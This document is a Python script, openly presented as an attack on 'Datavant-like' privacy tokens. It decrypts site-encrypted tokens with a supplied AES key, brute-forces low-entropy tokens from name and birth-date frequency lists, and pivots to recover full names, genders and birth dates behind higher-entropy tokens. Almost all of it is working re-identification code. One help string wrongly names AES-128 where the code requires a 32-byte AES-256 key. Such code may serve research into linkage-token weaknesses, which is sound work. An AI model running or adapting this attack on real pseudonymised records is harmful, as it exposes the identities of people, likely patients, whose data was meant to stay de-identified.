#!/usr/bin/env python3
import argparse
import base64
import csv
import hashlib
import hmac
import re
from collections import Counter, defaultdict
from datetime import datetime, date
from typing import Dict, Any, Iterable, Tuple, Set, Optional
from jellyfish import soundex
import cologne_phonetics 
from Crypto.Cipher import AES
import pandas as pd
from faker import Faker

# =============================
# Normalization / helpers
# =============================
def norm(s: Any) -> str:
    return "".join(ch for ch in str(s or "").strip().lower() if ch.isalnum())

def norm_gender(g: Any) -> str:
    g = str(g or "").strip().lower()
    if g in ("m", "male"): return "m"
    if g in ("f", "female"): return "f"
    return "u"

def norm_dob(s: Any) -> str:
    s = str(s or "").strip()
    fmts = ("%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y", "%Y/%m/%d", "%Y%m%d")
    for f in fmts:
        try:
            return datetime.strptime(s, f).strftime("%Y%m%d")
        except ValueError:
            pass
    if len(s) == 8 and s.isdigit():
        return s
    return ""

def first_initial(fn: str) -> str:
    n = norm(fn)
    return n[0] if n else ""

def first3(fn: str) -> str:
    n = norm(fn)
    return n[:3] if n else ""

# =============================
# Master token functions
# =============================
def master_sha256(token_input: str) -> bytes:
    return hashlib.sha256(token_input.encode("utf-8")).digest()  # 32 bytes

def master_hmac(master_salt: bytes, token_input: str) -> bytes:
    return hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256).digest()  # 32 bytes

def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
    """Accept hex or utf-8; optionally enforce expected length."""
    try:
        b = bytes.fromhex(s)
    except ValueError:
        b = s.encode("utf-8")
    if expect_len is not None and len(b) != expect_len:
        raise ValueError(f"Expected {expect_len} bytes, got {len(b)}")
    return b

# =============================
# Site encryption (AES-ECB)
# =============================
def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
    """Decrypt base64-encoded site token to raw 32-byte master token."""
    ct = base64.b64decode(token_b64)
    if len(ct) % 16 != 0:
        raise ValueError("Ciphertext is not a multiple of AES block size.")
    cipher = AES.new(site_key_32, AES.MODE_ECB)  # AES-256 (32-byte key)
    pt = cipher.decrypt(ct)
    # Expect SHA-256 output length
    if len(pt) != 32:
        # Some pipelines might pack more; keep it but warn upstream if needed
        pass
    return pt

# =============================
# Token input builders
# =============================
def mk_T1(ln: str, fn: str, g: str, dob: str) -> str:
    fi = first_initial(fn)
    if not (ln and fi and g and dob): return ""
    return f"{norm(ln)}|{fi}|{norm_gender(g)}|{dob}"

def mk_T2(ln: str, fn: str, g: str, dob: str) -> str:
    sdx_ln = soundex(ln); sdx_fn = soundex(fn)
    if not (sdx_ln and sdx_fn and g and dob): return ""
    return f"{sdx_ln}|{sdx_fn}|{norm_gender(g)}|{dob}"

def mk_T4(ln: str, fn: str, g: str, dob: str) -> str:
    if not (ln and fn and g and dob): return ""
    return f"{norm(ln)}|{norm(fn)}|{norm_gender(g)}|{dob}"

# =============================
# Load and decrypt site tokens
# =============================
def load_site_tokens(path: str, cols: Iterable[str]) -> Dict[str, list]:
    with open(path, newline="", encoding="utf-8") as f:
        r = csv.DictReader(f)
        rows = list(r)
    return {"_RAW": rows}

def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> Dict[str, Set[bytes]]:
    out: Dict[str, Set[bytes]] = {c: set() for c in colnames}
    successes = 0
    failures = 0
    for row in rows:
        for c in colnames:
            val = (row.get(c) or "").strip()
            if not val:
                continue
            try:
                mt = aes256_ecb_decrypt_b64(site_key_32, val)
                out[c].add(mt)
                successes += 1
            except Exception:
                failures += 1
                # keep going
    for c in colnames:
        print(f"[decrypt] {c}: unique master tokens={len(out[c])} (sample successes={successes}, failures={failures})")
    return out

# =============================
# Dictionaries
# =============================
""" with open("nachnamen.txt", "r", encoding="utf-8") as f:
    TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]

with open("vornamen.txt", "r", encoding="utf-8") as f:
    TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]

GENDERS = ["m","f","u"]

# Generate 200 birthdays
fake = Faker()
TOP_DOB = [fake.date_of_birth(minimum_age=18, maximum_age=90).strftime('%Y%m%d') for _ in range(200)] """

# =============================
# Similiar DB
# =============================

df_distribution = pd.read_csv(r"known_data_clean.csv")

TOP_FIRST = df_distribution["first_name"].value_counts().head(500).index.tolist()
TOP_LAST = df_distribution["last_name"].value_counts().head(500).index.tolist()
TOP_DOB = df_distribution["dob"].value_counts().head(500).index.tolist()
TOP_YOB = df_distribution["year_of_birth"].value_counts().head(500).index.tolist()
TOP_ZIP = df_distribution["zip"].value_counts().head(500).index.tolist()
TOP_ADDRESS = df_distribution["address"].value_counts().head(500).index.tolist()
GENDERS = ["m","f","u"]

# =============================
# Attack core
# =============================
def attack_entropy_first_T1(master_func, master_tokens: Set[bytes]) -> Dict[bytes, Tuple[str,str,str,str]]:
    """Dictionary attack against T1: ln|fi|g|dob. Return {master_token: (ln, fi, g, dob)}."""
    hits = {}
    for ln in TOP_LAST:
        for fi in "abcdefghijklmnopqrstuvwxyz":
            for g in GENDERS:
                for dob in TOP_DOB:
                    inp = f"{norm(ln)}|{fi}|{g}|{dob}"
                    if not inp: continue
                    mt = master_func(inp)
                    if mt in master_tokens:
                        hits[mt] = (norm(ln), fi, g, dob)
    return hits

def attack_entropy_first_T2(master_func, master_tokens: Set[bytes]) -> Dict[bytes, Tuple[str,str,str,str]]:
    """Dictionary attack against T2: sdx(ln)|sdx(fn)|g|dob. We store sdx codes."""
    hits = {}
    sdx_last = sorted({soundex(ln) for ln in TOP_LAST if soundex(ln)})
    sdx_first = sorted({soundex(fn) for fn in TOP_FIRST if soundex(fn)})

    """sdx_last = []
    for ln in TOP_LAST:
        last_cologne_tupel = cologne_phonetics.encode(ln) if cologne_phonetics.encode(ln) else None
        for _, last_cologne in last_cologne_tupel:
            sdx_last.append(last_cologne)
    sdx_last = sorted(sdx_last)

    sdx_first = []
    for fn in TOP_FIRST:
        first_cologne_tupel = cologne_phonetics.encode(fn) if cologne_phonetics.encode(fn) else None
        for _, first_cologne in first_cologne_tupel:
            sdx_first.append(first_cologne)
    sdx_first = sorted(sdx_first)"""

    for sdx_ln in sdx_last:
        for sdx_fn in sdx_first:
            for g in GENDERS:
                for dob in TOP_DOB:
                    inp = f"{sdx_ln}|{sdx_fn}|{g}|{dob}"
                    if not inp: continue
                    mt = master_func(inp)
                    if mt in master_tokens:
                        hits[mt] = (sdx_ln, sdx_fn, g, dob)
    return hits

def pivot_to_T4_from_T1_T2(master_func,
                           T4_master_tokens: Set[bytes],
                           t1_hit: Tuple[str,str,str,str],
                           t2_hit: Tuple[str,str,str,str] = None) -> Dict[bytes, Tuple[str,str,str,str]]:
    """
    Use knowledge from T1 (ln, fi, g, dob) and optional T2 (sdx_fn constraint) to brute-force T4 (ln|fn|g|dob).
    """
    ln, fi, g, dob = t1_hit
    sdx_fn_constraint = t2_hit[1] if t2_hit else None  # (sdx_ln, sdx_fn, g, dob)
    out = {}
    for fn in TOP_FIRST:
        if not fn or norm(fn)[0:1] != fi:
            continue
        if sdx_fn_constraint and soundex(fn) != sdx_fn_constraint:
            continue
        t4_inp = mk_T4(ln, fn, g, dob)
        if not t4_inp:
            continue
        mt = master_func(t4_inp)
        if mt in T4_master_tokens:
            out[mt] = (ln, norm(fn), g, dob)
    return out

# =============================
# Orchestrator
# =============================
def run_attack(args):
    # Master function
    if args.master_salt:
        ms = parse_bytes(args.master_salt)  # any length ok for HMAC key
        master_func = lambda s: master_hmac(ms, s)
        print("[*] Using HMAC-SHA256(master_salt, token_input).")
    else:
        master_func = lambda s: master_sha256(s)
        print("[*] Using SHA-256(token_input) (no master salt).")

    # Site key: AES-256 requires 32 bytes
    site_key = parse_bytes(args.site_key, expect_len=32)
    print(f"[*] Using AES-256-ECB for site token decryption (key length={len(site_key)}).")

    cols = [c.strip() for c in args.columns.split(",")]
    # Load & decrypt
    raw = load_site_tokens(args.infile, cols)
    rows = raw["_RAW"]
    dec = decrypt_columns(rows, site_key, cols)

    # If everything is empty, bail early with a hint
    if all(len(dec[c]) == 0 for c in cols):
        print("[!] No master tokens decrypted. Check: correct AES mode (ECB), key (32 bytes), base64 format, and that tokens are actually encrypted site tokens.")
        return

    # Phase 1: attack lowest-entropy tokens first (T1, T2)
    t1_hits = {}
    if "T1" in dec:
        print("[*] Attacking T1 (ln|fi|g|dob)...")
        t1_hits = attack_entropy_first_T1(master_func, dec["T1"])
        print(f"    -> Found {len(t1_hits)} T1 preimages")

    t2_hits = {}
    if "T2" in dec:
        print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob)...")
        t2_hits = attack_entropy_first_T2(master_func, dec["T2"])
        print(f"    -> Found {len(t2_hits)} T2 preimages")

    # Phase 2: pivot into T4 using knowledge from T1 (and optionally T2)
    t4_pivot_hits = {}
    if "T4" in dec and t1_hits:
        print("[*] Pivoting to T4 (ln|fn|g|dob) using T1 (and T2 if available)...")
        # Index T2 hits by (g,dob) for quick lookup of sdx_fn constraint
        t2_idx = defaultdict(list)
        for mt, tpl in t2_hits.items():
            sdx_ln, sdx_fn, g, dob = tpl
            t2_idx[(g, dob)].append((sdx_ln, sdx_fn))
        # For each T1 hit, try to resolve fn candidates and test T4
        for mt1, (ln, fi, g, dob) in t1_hits.items():
            # If T2 constraint exists for same (g,dob), use it
            if (g, dob) in t2_idx:
                for (_sdx_ln, sdx_fn) in t2_idx[(g, dob)]:
                    # Only consider T2 entries consistent with ln’s soundex
                    if _sdx_ln != soundex(ln):
                        continue
                    out = pivot_to_T4_from_T1_T2(master_func, dec["T4"], (ln, fi, g, dob), ( _sdx_ln, sdx_fn, g, dob))
                    t4_pivot_hits.update(out)
            else:
                out = pivot_to_T4_from_T1_T2(master_func, dec["T4"], (ln, fi, g, dob), None)
                t4_pivot_hits.update(out)
        print(f"    -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")

    # Report
    print("\n=== RESULTS ===")
    if t1_hits:
        print(f"[T1] {len(t1_hits)} master tokens cracked")
        for mt, tpl in list(t1_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} g={tpl[2]} dob={tpl[3]}")
    if t2_hits:
        print(f"[T2] {len(t2_hits)} master tokens cracked")
        for mt, tpl in list(t2_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  sdx_ln={tpl[0]} sdx_fn={tpl[1]} g={tpl[2]} dob={tpl[3]}")
    if t4_pivot_hits:
        print(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)")
        for mt, tpl in list(t4_pivot_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fn={tpl[1]} g={tpl[2]} dob={tpl[3]}")

    # Save results to a text file
    with open(args.outfile, "w", encoding="utf-8") as result_file:
        if t1_hits:
            result_file.write(f"[T1] {len(t1_hits)} master tokens cracked\n")
            for mt, tpl in t1_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
        if t2_hits:
            result_file.write(f"[T2] {len(t2_hits)} master tokens cracked\n")
            for mt, tpl in t2_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  sdx_ln={tpl[0]} sdx_fn={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
        if t4_pivot_hits:
            result_file.write(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)\n")
            for mt, tpl in t4_pivot_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fn={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")

def main():
    ap = argparse.ArgumentParser(description="Attack Datavant-like tokens: decrypt site tokens, crack low-entropy keys, pivot to higher-entropy.")
    ap.add_argument("--in", dest="infile", required=True, help="CSV with token columns (e.g., T1,T2,T4)")
    ap.add_argument("--out", dest="outfile", required=True, help="Output file for results")
    ap.add_argument("--columns", required=True, help="Comma-separated token column names to use (e.g., T1,T2,T4)")
    ap.add_argument("--site-key", required=True, help="AES-128 key (hex or utf-8) for site token decryption")
    ap.add_argument("--master-salt", default="", help="(Optional) master salt (hex or utf-8); if empty uses SHA-256(no salt)")
    args = ap.parse_args()
    run_attack(args)

if __name__ == "__main__":
    main()
